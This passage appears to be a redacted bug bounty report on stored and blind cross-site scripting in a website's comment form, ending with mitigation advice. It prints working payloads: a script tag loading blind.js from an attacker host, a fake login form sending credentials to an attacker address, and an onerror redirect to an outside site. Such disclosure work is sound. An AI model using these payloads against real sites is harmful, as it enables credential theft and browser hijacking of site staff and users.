I placed \"><script src=http://attackerip/blind.js/> in the Name field. Some example payloads for the Comments field are as follows:\nFor credential theft, an attacker could place <h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Logon\"></br> in the Comments field.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\nTo redirect to a malicious website, an attacker could use <img src=x onerror='javascript:window.open(\"http://catcompusa.com\")'></img>.\n\u2588\u2588\u2588\u2588\u2588\u2588\nThe malicious website will open in a new tab when the image fails to load as shown below:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nConclusions\nThis leads me to believe that once a \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 employee reads the comment, the code will be injected into their browser as well.\nAdditionally, the blind XSS payload injected into the Name field seemed to cause a hit on my weblog from \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 and \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588. \u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nSanitize how user input is parsed by the server before being reflected onto the resulting comment page to prevent XSS/HTML injection.\nImpact\nThe attacker could achieve numerous effects such as credential theft, forced browsing, keystroke logging, drive-by downloads, etc. ultimately leading to administrative access over the \u2588\u2588\u2588\u2588\u2588 website and potentially other internal resources.\n\n",
